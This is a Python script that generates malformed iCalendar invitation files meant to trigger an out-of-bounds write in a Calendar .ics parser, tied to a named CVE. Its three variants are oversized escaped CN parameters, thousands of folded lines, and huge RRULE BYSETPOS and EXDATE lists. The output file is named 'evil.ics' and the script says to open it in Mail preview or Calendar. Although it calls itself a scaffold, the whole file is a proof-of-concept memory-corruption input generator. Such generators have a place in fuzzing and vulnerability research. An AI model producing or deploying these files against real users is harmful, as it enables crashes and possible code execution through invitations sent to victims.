#!/usr/bin/env python3
"""
gen_ics_oob.py — SCAFFOLD, not an exploit.

Target : CVE-2026-112619 (Calendar, OOB write parsing an invitation)
Theory : one of three malformed-iCalendar cases overruns a buffer in the
         .ics parser:
           A) parameter-value unescape expands more than the escaped length
           B) a folded line exceeds the line buffer
           C) an RRULE/EXDATE list count exceeds the parsed entry count
Usage  : python3 gen_ics_oob.py <A|B|C> > evil.ics
Then   : open evil.ics in Mail preview / Calendar / EKICSParser.
"""

import sys
import datetime

def header():
    return ["BEGIN:VCALENDAR", "VERSION:2.0",
            "PRODID:-//scaffold//EN", "BEGIN:VEVENT",
            "UID:scaffold@example.invalid",
            "DTSTAMP:20260101T000000Z",
            "DTSTART:20260101T000000Z",
            "DTEND:20260101T010000Z"]

def footer():
    return ["END:VEVENT", "END:VCALENDAR"]

def variant_a():
    # Parameter-value unescape: a CN parameter full of escaped delimiters.
    # 64 KiB of '\\,' plus a trailing '\\' whose unescape may write a
    # terminator past the computed buffer.
    payload = "\\," * 32768
    lines = header()
    lines.append("ATTENDEE;CN=" + payload + "\\;ROLE=REQ-PARTICIPANT"
                 ":mailto:victim@example.invalid")
    lines.append("SUMMARY:" + "x" * 64)
    lines += footer()
    return "\r\n".join(lines) + "\r\n"

def variant_b():
    # Folded continuation line far exceeding any plausible line buffer.
    lines = header()
    long_line = "DESCRIPTION:" + "A" * 100
    lines.append(long_line)
    # RFC 5545 folds: each continuation is CRLF + SPACE.
    for _ in range(4000):
        lines.append(" " + "B" * 70)
    lines += footer()
    return "\r\n".join(lines) + "\r\n"

def variant_c():
    # RRULE with many BYSETPOS values and an EXDATE list whose entry count
    # is far larger than the parser's expected maximum.
    vals = ",".join(str(i) for i in range(1, 20001))
    dates = ",".join("202602%02dT000000Z" % (1 + (i % 28))
                     for i in range(20000))
    lines = header()
    lines.append("RRULE:FREQ=YEARLY;BYDAY=MO,TU,WE,TH,FR;"
                 "BYSETPOS=" + vals)
    lines.append("EXDATE:" + dates)
    lines.append("SUMMARY:rrule scaffold")
    lines += footer()
    return "\r\n".join(lines) + "\r\n"

def main():
    if len(sys.argv) != 2 or sys.argv[1].upper() not in ("A", "B", "C"):
        sys.stderr.write(__doc__)
        return 2
    v = sys.argv[1].upper()
    out = {"A": variant_a, "B": variant_b, "C": variant_c}[v]()
    sys.stdout.write(out)
    return 0

if __name__ == "__main__":
    sys.exit(main())
